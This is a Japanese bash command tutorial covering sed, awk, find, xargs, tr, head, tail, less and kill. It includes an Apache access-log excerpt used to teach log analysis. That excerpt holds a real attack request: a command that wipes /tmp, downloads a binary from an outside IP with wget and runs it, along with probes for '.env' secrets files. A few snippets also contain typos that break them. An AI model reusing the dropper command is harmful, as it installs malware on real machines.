cat filename | sed "/bbo/d"
```


### sed 空行の削除

``` bash
cat filename | sed '/^\s*$/d'
``` 

または

``` bash
cat filename | sed '/^$/d'
```

### sed 最後の行を削除

``` bash
cat filename | sed '$d'
```

### sed ファイルの末尾から最後の文字を削除

``` bash
cat filename | sed -i '$ s/.$//'
```

### sed 先頭の空白とタブを削除

``` bash
cat filename | sed -e 's/^[ \t]*//'
```

### sed 先頭の空白のみを削除

``` bash
cat filename | sed 's/ *//'
```

### sed 末尾のカンマを削除
``` bash
cat filename | sed 's/,$//g'
```



## 行挿入
### sed 最初の行として挿入
``` bash
sed '1 i foo
```


### sed 最初の行の後に (2 行目として) 挿入
``` bash
sed '1 a foo'
```


### sed AAA を含む行の上に BBB を含む行を挿入
``` bash
sed '/AAA/i BBB'
```



## 文字列の作成
### awk 特定の長さの文字列を作成します (例: 513 スペースを生成)
``` bash
awk 'BEGIN{while (a++<513) s=s " "; print s}'
```


### awk 特定の文字位置に特定の長さの文字列を挿入
(例 では、各入力行の列 6 の後に 49 個のスペースを挿入します)。
``` bash
gawk --re-interval 'BEGIN{while(a++<49)s=s " "};{sub(/^.{6}/,"&" s)};1'
```






## ファイル検索
### find 現在のディレクトリ内のすべてのサブディレクトリ/ファイルを一覧表示
``` bash
find .
```

### find 現在のディレクトリの下にあるすべてのファイルを一覧表示
``` bash
find . -type f
```

### find 現在のディレクトリの下にあるすべてのディレクトリを一覧表示
``` bash
find . -type d
``` 

### find 現在のディレクトリの下にあるすべてのファイルを編集
(たとえば、'www' を 'ww' に置き換えます)。
``` bash
find . -name '*.php' -exec sed -i 's/www/w/g' {} \;
```

### find ファイル名のみを検索して出力 (例: "mso")
``` bash
find mso*/ -name M* -printf "%f\n"
```

### find システム内の大きなファイルを見つける (例: >4G)
``` bash
find / -type f -size +4G
```

### find サイズが 74 バイト未満のファイルを見つけて削除する
``` bash
find . -name "*.mso" -size -74c -delete
```


### find 空の (0 バイト) ファイルを見つける
``` bash
find . -type f -empty
```

### find ディレクトリ内のすべてのファイルを再帰的にカウントする
``` bash
find . -type f | wc -l
```



## 並べ替え
### sort 列ごとにファイルを並べ替え、元の順序を維持する
``` bash
sort -k3,3 -s
```


## 折返し
### fold 指定された幅に収まるように各入力行を折り返す
(例: 1 行あたり 4 つの整数)
``` bash
echo "00110010101110001101" | fold -w4
0011
0010
1011
1000
1101
```

## タブの置換
### expand タブをスペースに変換
``` bash
expand filename
```


### unexpand スペースをタブに変換
``` bash
unexpand filename
```

## Webページをダウンロード
### wget Webページをダウンロード
``` bash
wget -r -l1 -H -t1 -nd -N -np -A mp3 -e robots=off http://example.com
```


### wget ファイル名を指定してダウンロード(長い名前の場合)
``` bash
wget -O filename "http://example.com"
```

### wget ファイルをフォルダーに
``` bash
wget -P /path/to/directory "http://example.com"
```


## 文字の削除と置換
### tr すべての非印刷文字を削除
``` bash
tr -dc '[:print:]' < filename
```


### tr 改行を削除
``` bash
tr --delete '\n' <input.txt >output.txt
```
または

``` bash
tr -d '\n' <input.txt >output.txt
```

### tr 改行を置換
``` bash
tr '\n' ' ' <filename
```

### tr 大文字/小文字へ
``` bash
tr /a-z/ /A-Z/
```

### tr 改行をスペースに変換します。
``` :doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.  
```

```
bash-3.2$ cat doc01.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat doc01.txt | tr -d '\n'
This book is suitable for classroom use as a general introduction to programming concepts.This document is herewith granted to the Public Domain. No copyright!bash-3.2$
```


### tr CRLF を LF 形式に変換します。
行末にCRLF形式の改行「」が入っているテキスト。
「」は、Ctrl＋VとCtrl＋Mで入力できます。

``` :CRLF.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
```

```
bash-3.2$ cat CRLF.txt
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$ cat CRLF.txt | tr -d '\r'
This book is suitable for classroom use as a general introduction to programming concepts.
This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
```


## xargs
### タブを区切り文字として設定 (デフォルト: スペース)
``` bash
xargs -d\t
```

### コマンドを実行する前にコマンドをプロンプトする
``` bash
ls|xargs -L1 -p head
```

### 1 行に 3 項目を表示
``` bash
echo 1 2 3 4 5 6| xargs -n 3
# 1 2 3
# 4 5 6
```

### 実行前のプロンプト
``` bash
echo a b c |xargs -p -n 3
```

### `find` の結果を `rm` する
``` bash
find . -name "*.html"|xargs rm
```

### ファイル名に空白が含まれるファイルを削除します (例: 「hello 2001」)
``` bash
find . -name "*.c" -print0|xargs -0 rm -rf
```

### ファイルをフォルダに移動
``` bash
find . -name "*.bak" -print 0|xargs -0 -I {} mv {} ~/old
```

または、

``` bash
find . -name "*.bak" -print 0|xargs -0 -I file mv file ~/old
```

### 最初の 100 番目のファイルをディレクトリ (例: d1) に移動します。
``` bash
ls |head -100|xargs -I {} mv {} d1
```

### 並行処理
``` bash
time echo {1..5} |xargs -n 1 -P 5 sleep
```

### すべてのファイルを A から B にコピーします
``` bash
find /dir/to/A -type f -name "*.py" -print 0| xargs -0 -r -I file cp -v -p file --target-directory=/path/to/B
```

### ファイル名をファイルの最初の行に追加します
``` bash
ls |sed 's/.txt//g'|xargs -n1 -I file sed -i -e '1 i\>file\' file.txt
```

### すべてのファイルの行数を出力
``` bash
ls |xargs -n1 wc -l
``` 

### 出力を 1 行にする
``` bash
ls -l| xargs
```

### すべてのファイルの行をカウントし、合計行もカウントします
``` bash
ls|xargs wc -l
```

### Xargs と grepを組み合わせる
``` bash
cat grep_list |xargs -I{} grep {} filename
```

### Xargs と sed (/etc ディレクトリの下のすべての古い IP アドレスを新しい IP アドレスに置き換えます)
``` bash
grep -rl '192.168.1.111' /etc | xargs sed -i 's/192.168.1.111/192.168.2.111/g'
```

## if
### 文字列一致の検出
``` bash
if [[ "$c" == "read" ]]; then outputdir="seq"; else outputdir="write" ; fi
```

### myfile に文字列 'test' が含まれているかどうかを確認
```
``` bah
if grep -q hello myfile; then echo -e "file contains the string!" ; fi
```

### 変数がnull であるかを確認
``` bash
myvariable="";if [ ! -s "myvariable" ]; then echo -e "variable is null!" ; fi
```

### 該当のファイルが存在するかを確認
``` bash
if [ -e 'filename' ];then echo -e "file exists!"; fi
```

### ファイルに加えてシンボリックリンクの存在も確認
``` bash
if [ -e myfile ] || [ -L myfile ];then echo -e "file exists!"; fi
```

### xの値が５以上かどうかを確認
``` bash
if [ "$x" -ge 5 ]; then echo -e "greater or equal than 5!" ; fi
```

### bash版：xの値が５以上かどうかを確認
``` bash
if ((x >= 5)); then echo -e "greater or equal than 5!" ; fi
```

### (( )) を使う
``` bash
j=3;u=1;if ((j==u+2)); then echo -e "j==u+2";fi
```

### [[ ]] を使う
``` bash
age=25;if [[ $age -gt 21 ]]; then echo -e "forever 21" ; fi
```

## for
### ディレクトリ内のファイル名を出力
``` bash
for i in $(ls); do echo file: $i;done
```

もしくは、

``` bash
for i in *; do echo file: $i; done
```

### myfile内に記載された名前を使ってディレクトリを作成
``` bash
for dir in $(<myfile); do mkdir $dir; done
``` 

## openssl
### 16 進数の MD5 チェックサム値を base64 エンコード形式に変換します。
``` bash
openssl md5 -binary /path/to/file| base64
# NWbeOpeQbtuY0ATWuUeumw==
```

## 言語属性
### アプリケーションが出力にデフォルト言語を使用することを強制します
``` bash
export LC_ALL=C

# to revert:
unset LC_ALL
```

### 文字列を Base64 文字列としてエンコードする
``` bash
echo test|base64
#dGVzdAo=
```

## バッググラウンド処理
### バックグラウンドで複数のコマンドを実行する
``` bash
(sleep 2; sleep 3) &

# run parallelly
sleep 2 & sleep 3 &
```

## CSV系
### .xls を csv に変換
``` bash
xls2csv filename
```

## ステータス処理
### 別のコマンドがゼロの終了ステータスを返す場合にのみコマンドを実行します (よくできました)
``` bash
cd tmp/ && tar xvf ~/a.tar
```

### 別のコマンドがゼロ以外の終了ステータスを返した場合にのみコマンドを実行する (終了していない)
``` bash
cd tmp/a/b/c ||mkdir -p tmp/a/b/c
```

## read
### ユーザー入力の読み取り
``` bash
read input
echo $input
```

## 配列
### 配列の宣言
``` bash
declare -a array=()
```

または
``` bash
declare array=()
```

または
``` bash
declare -A array=()
```

## 圧縮・解凍
### tar.bz2 ファイルを解凍します (例: file.tar.bz2)。
``` bash
tar xvfj file.tar.bz2
```

### tar.xz ファイルを解凍します (例: file.tar.xz)。
``` bash
unxz file.tar.xz
tar xopf file.tar
```

### pdftotext
### PDFをtxtに変換
``` bash
sudo apt-get install poppler-utils
pdftotext example.pdf example.txt
```




## catコマンド
- ファイルの内容を表示する
- ファイルの内容を行番号付きで表示する
- 複数ファイルを連結して1つのファイルにする

### 概要
「cat」は、「conCATenate（つなぐ、連結する）」のcatです。ファイルを連結するためのコマンドですが、ファイルの内容を表示する際によく使われます。

```
$ cat ＜ファイル名＞
```


### catコマンドの書式
cat [オプション] ファイル1 ファイル2……


### catコマンドの主なオプション
catコマンドの主なオプションは次の通りです。

|オプション|長いオプション|意味|
|:--------:|--------------|----|
|-n        |--number      |行番号を付け加える|
|-b        |--number-nonblank|行番号を付け加える。ただし空白行には付けない|
|-s        |--squeeze-blank|連続した空行を1行にする|


{{% tips-list tips %}}
ヒント
: 一画面に収まらない長いファイルの場合は、lessコマンドを使うと便利です。
{{% /tips-list %}}


### catコマンド詳細説明

### ファイルの内容を出力
filenameの内容をターミナルに出力します。

```
$ cat filename
```

長いファイルの場合は、lessコマンドを使います。

```
$ cat filename | less
```

### ファイルの結合
複数のファイルを結合（連結）させて別ファイルへ出力します。

```
$ cat filename1 filname2 > filename3
```

追記したい場合は「>>」を使います。

```
$ cat filename1 filname2 >> filename3
```

{{% tips-list tips %}}
ヒント
: 「>」をリダイレクト、「>>」をアペンドと言います。「>」はファイルを新規作成してファイルへ出力します。「>>」は既存のファイルへ追記出力します。
: 「>」は、内容があってもファイルの内容を空にして出力することに注意しなくてはなりません。
{{% /tips-list %}}


## echoコマンド
- メッセージや環境変数を表示します。

### 概要
「echo」はメッセージなどを表示するコマンドです。

```
$echo メッセージ
```

でメッセージを表示します。

```
$ echo $変数名
```

で環境変数やシェルスクリプト内の変数を表示する際にも使用います。


### echoコマンドの書式
  echo [オプション] メッセージ

### echoの主なオプション
|オプション	|意味                  |
|:---------:|----------------------|
|-n         |最後の改行を出力しない|
|-e         |エスケープを解釈する  |
|-E	        |エスケープを解釈しない（デフォルト）|  


### echo コマンド詳細説明
<font color=orange><b> echoコマンドの使用：</b></font>
さまざまなオプションでechoコマンドを使用できます。
次の例では、いくつかの便利なオプションについて説明します。
オプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。
'-n'オプションは、改行なしでテキストを印刷するために使用されます。
'-e'オプションは、出力からバックスラッシュ文字を削除するために使用されます。
'echo_example.sh'という名前の新しいbashファイルを作成し、次のスクリプトを追加します。

``` bash:echo_example.sh
#!/bin/bash

echo "改行付きのテキストの印刷";
echo -n "改行なしのテキストの印刷";
echo -e "\n削除\tバックスラッシュ\t文字\n";
```


bashコマンドでファイルを実行します。


```
$ bash echo_example.sh
改行付きのテキストの印刷
改行なしのテキストの印刷
削除	バックスラッシュ	文字
$
```



### Hello World
<font color=orange><b>はじめてのbashコマンド「echo」</b></font>
ターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。


```:はじめてのecho
$ echo "Hello, World";
Hello, World
$
```

 はじめてのbashスクリプト「vim」

```bash:はじめてのbashスクリプト
$ vim HelloWorld.sh
＜空のvim HelloWorld.sh が開きます＞
```

vimで開いたHelloWorld.shを編集します。

```bash:HelloWorld.sh
#!/bin/bash

echo "Hello World";
```

{{% tips-list tips %}}
ヒント
: echo の後ろに続く文字列は 「""」（ダブるクォーテーション）または、「''」（シングルクォーテーション）で囲みましょう。
: 行末の「;」（セミコロン）も忘れずに。
{{% /tips-list %}}


## headコマンド
- headコマンドでファイルの先頭部分だけを表示する
- パイプを使って実行結果の最初の部分だけを確認する
- tailコマンドでファイルの末尾部分だけを表示する
- ログファイルを監視する


### 概要
headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。
表示する行数は、オプションで変更することができます。

```
$ cat ＜ファイル名＞ | head -n10
```

headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。

### headコマンドの書式
head [オプション] ファイル名


### headコマンドの主なオプション


|オプション  |長いオプション  |意味|
|:----------:|----------------|----|
|-c  数字    |--bytes 数字      |先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000*1000, M=1024*1024…）|
|-n  数字    |--lines 数字      |先頭から指定した行数のみ表示する|
|-q          |--quiet, --silent |ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）|
|-v          |--verbose         |常にファイルごとのヘッダ出力を行う|


### headコマンド詳細説明
headコマンドはファイルの先頭から１０行を表示するコマンドです。

```
$ cat filename | head 
```

よく使われるオプションは、出力する行数を指定するオプション「n」です。

```
$ cat filename | head -n20
```

データをソートしてベスト１０を出力するという場合によく使います。

```
$ sudo cat /var/log/httpd/access_log | grep -iv "ELB-Health-Checker" | awk -F '"' '{ print $1; }' | awk '{ print $2; }' | sort | uniq -c | sort -nr | head
```

sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。
では、順番に説明していきます。

まずは純粋にアクセスログを出力します。
長いのでheadコマンドを使いましょう。

```
suzuki$ sudo cat /var/log/httpd/access_log | head
172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.44.102 - - [28/Nov/2021:03:10:13 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] "GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1" 302 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154"
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] "CONNECT guba.eastmoney.com:443 HTTP/1.1" 302 215 "-" "Apache-HttpClient/4.1 (java 1.5)"
:
:
:

```

AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。
grepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。

```
suzuki$ sudo cat /var/log/httpd/access_log | grep -v "ELB-HealthChecker" | head
 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] "GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1" 302 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154"
 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] "CONNECT guba.eastmoney.com:443 HTTP/1.1" 302 215 "-" "Apache-HttpClient/4.1 (java 1.5)"
 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] "GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1" 302 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154"
 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] "CONNECT guba.eastmoney.com:443 HTTP/1.1" 302 215 "-" "Apache-HttpClient/4.1 (java 1.5)"
 98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws" 400 226 "-" "-"
 61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] "GET http://dushu.baidu.com HTTP/1.1" 302 208 "-" "-"
 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] "POST / HTTP/1.1" 302 205 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] "GET /.env HTTP/1.1" 302 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
 61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] "GET http://dushu.baidu.com HTTP/1.1" 302 208 "-" "-"
 164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] "CONNECT www.yahoo.com:443 HTTP/1.1" 302 210 "-" "Go-http-client/1.1"
 suzuki$
 ```

 それっぽいログが出るようになりました。
 次にどこからのアクセスが多いのかを絞り込みます。

 ```
 suzuki$ sudo cat /var/log/httpd/access_log | grep -v "ELB-HealthChecker" | awk -F '"' '{ print $2; }' | head
  GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
  CONNECT guba.eastmoney.com:443 HTTP/1.1
  GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
  CONNECT guba.eastmoney.com:443 HTTP/1.1
  GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws
  GET http://dushu.baidu.com HTTP/1.1
  POST / HTTP/1.1
  GET /.env HTTP/1.1
  GET http://dushu.baidu.com HTTP/1.1
  CONNECT www.yahoo.com:443 HTTP/1.1
  suzuki$
  ```

  GETとPOSTの項目に絞り込まれました。
  awk コマンドの -F はセパレータで、この場合は '"' を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。

次は、GET, CONNECT, POSTなどのコマンドを除去します。
awkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。

```
suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v "ELB-HealthChecker" | awk -F '"' '{ print $2; }' | awk '{ print $2; }' | head
 http://guba.eastmoney.com/list,hk01500_1.html
 guba.eastmoney.com:443
 http://guba.eastmoney.com/list,hk01500_1.html
 guba.eastmoney.com:443
 /shell?cd+/tmp;rm+-rf+*;wget+
 http://dushu.baidu.com
 /
 /.env
 http://dushu.baidu.com
 www.yahoo.com:443
 suzuki$
```

次に、余計な出力を抑制します。
ここでは空白行を出力したくないので grep -v ^$ を使っています。
非常によく使うオプションなので覚えておくとよいです。

{{% tips-list tips %}}
ヒント
: grep -v ^$
: 空行を出力しない
: 行頭を表す「^」と行末を表す「$」の間に何もないですね。
{{% /tips-list %}}


では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。

```
suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v "ELB-HealthChecker" | awk -F '"' '{ print $2; }' | awk '{ print $2; }'| grep -v ^$ | grep -v [*/] |s
 ort| head
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 suzuki$
 ```

 最後に、出力をアルファベット順に並べ替えます。sortでよいです。
 さらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。
 そして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。


 ```
 suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v "ELB-HealthChecker" | awk -F '"' '{ print $2; }' | awk '{ print $2; }'|sort|uniq -c|sort -nr | head
850 http://dushu.baidu.com
839 /form.cgi
485 http://www.baidu.com/pub/css/new_font.css
477 /
265 *
258 guba.eastmoney.com:443
253
209 /.env
200 www.yahoo.com:443
184 istock.jrj.com.cn:443
suzuki$
```

{{% tips-list tips %}}
ヒント
:sudo cat filename | grep -v "除去したい文字列" | awk '{ print $2; }'| sort | uniq -c |sort -nr | head
: これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。 
{{% /tips-list %}}


head コマンドの紹介の割には長くなりました。



## tailコマンド
 - tailコマンドでファイルの末尾部分だけを表示する
 - ログファイルを監視する
 - ファイルの特定の範囲の行を取り出す（headとtail）

### 概要
headコマンドとは逆に、ファイルの末尾だけ表示するのがtailコマンドです。

ログファイルは、基本ファイルの末尾に新たな記録が追加されます。
「more」コマンドや「less」コマンドで表示しようとすると、末尾まで進むのが面倒だし、ファイルが大きい場合は読み込むのにも時間がかかります。
「tail」コマンドは、ファイルの末尾開かないので手軽で処理も高速です。

```
$ cat ＜ファイル名＞ | tail 
```


tailコマンドも、headコマンド同様、「-n」オプションで表示する行数を指定することができます。

```
$ cat ＜ファイル名＞ | tail -n10
```

また、tailコマンド最大の魅力は リアルタイムに出力を追記する tail -fです。
ログ監視などに多用されるこの具体例も以下に示します。

```
$ sudo tail -f /var/log/httpd/access_log
```


### tailコマンドの書式
tail [オプション] ファイル名


### tailコマンドの主なオプション
|短いオプション|長いオプション|意味|
|:------------:|--------------|----|
|-c 数字       |--bytes 数字  |末尾の指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000*1000, M=1024*1024…）|
|-n 数字       |--lines 数字  |末尾の指定した行数のみ表示する|
|-q            |--quiet, --silent |ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）|
|-v            |--verbose |常にファイルごとのヘッダ出力を行う|
|-f            |--follow  |ファイルを監視して内容が追加されるたびに末尾に表示する（ログ監視などに使用する。［Ctrl］＋［C］キーで終了）|


### tailコマンド詳細説明

### tailコマンドでファイルの末尾部分だけを表示する
ファイルの末尾を表示します。tail -n で表示行数を変更できます。
tail -n10 と デフォルトの tail は同じ出力となります。

```
$ cat filename | tail -n10
```

### ログファイルを監視する

tailコマンドの「-f」オプションを使うと、ログファイルのように、刻々と内容が追加されていくファイル監視ができるようになります。「-f」は、ファイルなどを監視する際、内容が新たに追加されるたびに末尾に表示するオプションです。ログの監視を終了するには、［Ctrl］＋［C］キーを押します。

```
$ sudo tail -f /var/log/httpd/error_log 
```


{{% tips-list tips %}}
ヒント
: tail -f コマンドはとてもよく使います。 
: tail -f を実行するtailf コマンドもあります。(Oによりますが)
{{% /tips-list %}}


### ファイルの特定の範囲の行を取り出す（headとtail）

ファイル後ろの200行目のところから、ファイル先頭に向かって100行を取り出すにはどうしたらよいか？


```
cat filename | tail -n200
```

これだとファイル末尾から200行を出力するにすぎない。
tail コマンドのみに頼ろうとすると難しいようだ。
実は、head コマンドも使えば、「後ろ200行の先頭100行」を取り出せる。

```
$ cat filename | tail -n200 | head -n 100
```

コマンドの実行結果の10001行目から10100行目までが欲しい時は以下の通り。

```
$ cat filename | head -n10100 | tail -n100
```


## lessコマンド
- テキストを1画面ずつ表示する
- キー操作のヘルプを表示する
- 長い行を折り返さずに表示する
- ファイルの末尾まで表示したらすぐに終了する

### 概要
「less」コマンドは、テキストファイルを1画面ずつ表示するコマンドです。

```
$ cat ＜ファイル名＞ | less
```

「less ファイル名」で実行する他、「コマンド | less」のように、別のコマンドの実行結果を1画面ずつ表示する場合にも使われます。

```
$ dmesg | less 
```


{{% tips-list tips %}}
ヒント
: ［Enter］キーで1行、スペースキーで1画面先に進める他、上下矢印キーによるスクロールも可能です。表示を終了するには［Q］または［q］キーを入力します。
{{% /tips-list %}}


　同じ用途のコマンドに「more」があります。lessコマンドはmoreコマンドよりも機能が多く、画面内で検索したり、上にスクロールしたりすることが可能です。


### lessコマンドの書式
less [オプション] ファイル名
コマンド | less [オプション]

### lessコマンドの主なオプション

|短いオプション |長いオプション |意味|
|:-------------:|---------------|----|
|+行数,-行数    |               |指定した行から表示する|
|+/文字列       |               |指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能）|
|-p文字列       |--pattern=文字列|指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能）|
|-oファイル     |--log-file=ファイル| パイプ（｜）などで標準入力から入力した内容を表示する際、指定したファイルにコピーを保存する。既存ファイルを指定した場合は、上書きするか、追加するかを確認するメッセージが表示される|
|-Oファイル     |--LOG-FILE=ファイル| 「-o」と同じだが、既存ファイルを指定した場合は、確認せずに上書きする|
|-kファイル名   |--lesskey-file=ファイル名| lesskeyファイル（キー定義ファイル、「lesskey」コマンドで生成）を指定する|
|-L             |--no-lessopen  | 環境変数LESSOPEN（lessコマンド用のオプションを定義した環境変数）を無視する|



### lessコマンド詳細説明

### テキストを1画面ずつ表示する

```
$ less ＜ファイル名＞
```

で、指定したファイルを1画面ずつ表示します。
次の画面へ進みたい場合はスペースキー、1行ずつ進めたい場合は［Enter］キーを押します。
上下の矢印キーや、［y］または［e］キー、［j］または［k］キーで上下にスクロールすることも可能です。
［q］キーを押すと終了します。


以下のような使い方もできます。
```
$ cat <filename> | less
```

### キー操作のヘルプを表示する

lessコマンドで画面を表示中に［h］キーを押すと、キー操作のヘルプが表示されます。
ヘルプの表示中でもlessコマンドと同様に、上下のスクロールや検索などの操作が可能です。

［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります 


### 長い行を折り返さずに表示する

lessコマンドでは、画面の横幅より長い行は折り返して表示されます。
折り返さずに表示したい場合は、「-S」オプションを使用します。

左右の矢印キーまたは、［ESC］キーに続いて［(］および［)］キーを押すと、左右に半画面分スクロールします。
横スクロールの幅は「-#」オプションで指定できます。　

```
$ cat filename | less -S
```

{{% tips-list tips %}}
ヒント
: ［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります。
{{% /tips-list %}}



## moreコマンド
- 長いメッセージやテキストファイルを1画面ずつ表示する
- テキストを1画面ずつ止めながら表示する
- 実行結果を止めながら表示したいときにはパイプを使う
- 確認したい箇所がある場合は「+/オプション」でスキップ
- 行番号付きで表示したいときはcatコマンドと組み合わせる
- moreコマンドで使える主なサブコマンド

### moreコマンド概要

moreコマンドは、テキストファイルを1画面ずつ表示するページャコマンドです。

```
$ more <ファイル名>
```

で実行する他、

```
$ cat <ファイル名> | more
```

のように他のコマンドの実行結果を1画面ずつ表示する際によく使われます。

　また、moreコマンドにサブコマンドがあり、［Enter］キーで1行、［スペース］キーで1画面先に進み、ファイルの末尾まで表示されると終了します。ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。

### moreコマンドの書式

more [オプション] filename
cat filename | more [オプション]

### moreコマンドの主なオプション


|オプション |意味|
|---------------|----|
|+数値  |数値で指定した行から表示する|
|+/文字列 |指定した文字列を検索して、見つけた行の2行上から表示する|
|-s |連続した空行を1行にする|
|-l |改ページを無視する|
|-u |下線の処理を行わない|
|-数値  |画面の行数を指定する|
|-f |画面での行数ではなく、データの行数を表示する|
|-d   |無効なキーが入力された場合には、ビープ音の代わりに簡単なヘルプを表示する|


### moreコマンド詳細説明
「cat」コマンドでテキストファイルの内容を表示したら、思ったよりも長くコマンドを実行した結果がどんどん上に流れてしまって、テキストファイルのの最初の方が読めない！ そんなときに便利なのが「more」コマンドです。

moreコマンドは、「more ファイル名」で指定したファイルを1画面ずつ止めながら表示します。次の画面へ進みたいときは［スペース］キーを、1行ずつ画面を進めたいときは［Enter］キーを押します。

ファイルをページャとして読みたい場合

```
$ cat <filename> | more
```

dmsgなどのシステムファイルをページャとして読みたい

```
$ dmsg | more 
```

{{% tips-list tips %}}
ヒント
: 検索を行う場合はページャ画面で「/」記号に続けて検索文字列を入力し、［Enter］キーを押すとその位置までスキップします。nで直前の検索を繰り返します。
{{% /tips-list %}}


{{% tips-list tips %}}
ヒント
: ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。
{{% /tips-list %}}


## killコマンド
- killコマンドでプロセスIDを指定してプロセスを終了させる
- killallコマンドで名前を指定してプロセスを終了させる

### killコマンド概要
プロセスを強制終了させます。
killは実行中のプロセスを終了させる場合に使うコマンドです。

killコマンドでプロセスを終了させるには、

```
$ kill ＜プロセスID＞
```

で指定します。
例えば、100番のプロセスならば

```
$ kill 100
```

と指定します。
プロセスIDは「ps」コマンドで調べることができます。

### killコマンドの書式
kill [オプション] プロセスID

### killコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-s シグナル   |プロセスに送るシグナル名または番号。-シグナル名、-番号でも指定可能|
|-l            |シグナル名のリストを表示する|

### killコマンド詳細説明

### プロセスＩＤでプロセスを終了させる
「kill プロセスID」で、指定したプロセスを終了させることができます。プロセスIDは「ps」コマンドで確認できます。

```
$ kill ＜プロセスＩＤ＞
```

### killallコマンドで名前を指定してプロセスを終了させる
「killall 名前」で、“名前”に指定したプロセスを終了させることができます。

```
$ killall ＜プロセス名＞
```

### さまざまなプロセスの調べ方と終了方法

ps aux を使う方法

```
bash-5.1$ ps axu | grep hugo | grep -v grep
